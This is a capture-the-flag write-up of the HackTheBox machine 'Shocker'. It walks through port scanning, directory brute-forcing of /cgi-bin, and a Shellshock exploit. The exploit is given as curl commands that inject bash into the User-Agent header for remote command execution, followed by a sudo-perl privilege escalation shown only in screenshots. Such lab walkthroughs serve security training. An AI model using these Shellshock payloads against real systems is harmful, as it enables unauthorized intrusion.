# Shocker

This is the write-up for the box Shocker

I start by adding this box into my /etc/hosts file:
```markdown
10.10.10.56    shocker.htb
```

## Enumeration

Starting with a general Nmap scan on all ports, followed by a detailed scan on the open ports found:

```markdown
nmap 10.10.10.56 -Pn -p-
```

```markdown
PORT     STATE SERVICE
80/tcp   open  http    
2222/tcp open  EtherNetIP-1
```

Saving the output of the detailed nmap scan.

```markdown
nmap 10.10.10.56 -Pn -p22,80 -sC -sV -oA shocker
```

```markdown
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

Vistied the website, did not find anything interesting except for the text _"Don't bug me"_. There wasn't anything in the source code as well. <br>
<img src="https://i.imgur.com/FS3KADF.png" height="80%" width="80%" alt="shocker"/> <br>
<img src="https://i.imgur.com/TZM7jRQ.png" height="80%" width="80%" alt="shocker"/> <br>

I opened up **dirbuster** to start enumeration and look for hidden directories.

<img src="https://i.imgur.com/EXvUkP4.png" height="80%" width="80%" alt="shocker"/> <br>

I found these directories after running dirbuster:
<img src="https://i.imgur.com/JVUjm75.png" height="80%" width="80%" alt="shocker"/> <br>

I did a google search on potential vulnerabilities of the _/cgi-bin_ directory, which leads us to the shellshock vulnerability. <br>

The next thing I tried is to continue enumerating the cgi-bin directory, to see if there are potential scripts there which I can use (with _.sh_ or _.cgi_ file extension):

<img src="https://i.imgur.com/Mafj31M.png" height="80%" width="80%" alt="shocker"/> <br>

This leads me to the _user.sh_ script and the contents are the results of the `uptime` command.

<img src="https://i.imgur.com/6cOOk6F.png" height="80%" width="80%" alt="shocker"/> <br>

### Exploiting the box

To use the Shellshock exploit, I tweaked the `curl` command found on HackTricks.xyz, and was able to gain RCE in the system as the user shelly
```markdown
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'whoami'" HTTP://10.10.10.56/cgi-bin/user.sh/
shelly
```

Using the `ls` command, I was able to retrieve the user flag within the home directory of shelly.

```markdown
curl -H "User-Agent: () { :; }; echo; /bin/bash -c 'ls /home/shelly'" HTTP://10.10.10.56/cgi-bin/user.sh/
user.txt
```
## Privilege Escalation

However, the user shelly does not have access to the root directory, to check its privileges, I ran the sudo -l command, and found that shelly can execute perl script without password as root

<img src="https://i.imgur.com/c58zS4q.png" height="80%" width="80%" alt="shocker"/> <br>

I decided to get an actual reverse shell so that privilege escalation will be easier. Start listener on host machine and connect to host for a reverse shell.

<img src="https://i.imgur.com/CnsjuCg.png" height="80%" width="80%" alt="shocker"/> <br>
<img src="https://i.imgur.com/M9W5hn8.png" height="80%" width="80%" alt="shocker"/> <br>

Knowing that I am able to run perl command with sudo without password, I was able to get the root flag as well
<img src="https://i.imgur.com/P1cHudk.png" height="80%" width="80%" alt="shocker"/> <br>
